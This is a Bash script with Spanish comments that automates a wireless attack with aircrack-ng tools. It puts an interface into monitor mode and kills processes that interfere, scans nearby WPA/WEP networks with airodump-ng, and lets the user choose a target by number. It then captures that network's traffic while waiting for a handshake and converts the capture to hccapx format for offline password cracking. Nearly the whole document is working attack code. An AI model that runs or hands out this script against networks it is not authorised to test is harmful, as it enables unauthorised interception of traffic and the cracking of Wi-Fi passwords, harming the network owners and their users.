#!/bin/bash

# Mostrar las interfaces disponibles
echo "Interfaces disponibles:"
interfaces=$(airmon-ng | grep "phy" | awk '{print $2}')
num_interfaces=$(echo "$interfaces" | wc -l)

# Enumerar las interfaces disponibles con un número delante
count=1
while read -r interface; do
  echo "$count) $interface"
  ((count++))
done <<< "$interfaces"

# Solicitar al usuario que seleccione una interfaz
echo "Seleccione una interfaz para poner en modo monitor (1-$num_interfaces):"
read opcion

# Validar la opción ingresada por el usuario
if ! [[ "$opcion" =~ ^[0-9]+$ ]] || [ "$opcion" -lt 1 ] || [ "$opcion" -gt "$num_interfaces" ]; then
  echo "Opción inválida: $opcion. Seleccione una opción válida (1-$num_interfaces)."
  exit 1
fi

# Obtener el nombre de la interfaz seleccionada
interfaz=$(echo "$interfaces" | sed -n "${opcion}p")

# Verificar si la interfaz ya está en modo monitor, si lo esta desactivamos el modo monitor de esa
# interfaz y terminamos el programa
if [[ "$interfaz" == *mon ]]; then
  echo "La interfaz $interfaz ya está en modo monitor."
  if [[ "$1" = "-d" ]]; then
    echo "Desactivando el modo monitor..."
    airmon-ng stop $interfaz
    exit 0
  fi
else
  # Poner la interfaz en modo monitor ocultando la salida al usuario
  echo "Poniendo la interfaz $interfaz en modo monitor... "
  airmon-ng start $interfaz >/dev/null
  # Ahora la interfaz al estar en modo monitor se le agrega el subfijo mon
  interfaz+=mon
  # Matar los procesos que interrumpan a la interfaz
  airmon-ng check kill >/dev/null  
fi

# Mostrar el estado de la interfaz en modo monitor
echo "Buscando redes Wifi (Esper 5 Segundos)..."

# Escanear las redes wifi disponibles durante 10 segundos
sudo timeout 5s airodump-ng --write output --output-format csv  --write-interval 1 --showack $interfaz >/dev/null

# Mostrar la lista de redes wifi disponibles con un número de selección
echo "Redes Wi-Fi disponibles:"
mv output-01.csv output.csv
cat output.csv | grep 'WPA\|WEP' | awk -F ',' '{print NR ") ", $4, "\t", $1, "\t", $14}'

# Solicitar al usuario que seleccione una red wifi
echo "Seleccione la red Wi-Fi a la que desea conectar:"
read ssid_number

# Traemos el SSID, Mac y Channel de la red seleccionada
ssid=$(cat output.csv | grep 'WPA\|WEP' | sed -n "${ssid_number}p" | awk -F ',' '{print $14}')
ssid=$(echo $ssid | tr -d ' ')
mac=$(cat output.csv | grep 'WPA\|WEP' | sed -n "${ssid_number}p" | awk -F ',' '{print $1}')
mac=$(echo $mac | tr -d ' ')
channel=$(cat output.csv | grep 'WPA\|WEP' | sed -n "${ssid_number}p" | awk -F ',' '{print $4}')
channel=$(echo $channel | tr -d ' ')
rm output.csv
echo "SSID: $ssid"
echo "MAC : $mac"
echo "CH  : $channel"

#Empezamos a Capturar los paquetes de la red Seleccionada a la espera del Handshake
sudo airodump-ng -c $channel --bssid $mac --output-format cap -w captura $interfaz
cap2hccapx captura-01.cap $ssid.hccapx
mv captura-01.cap $ssid.cap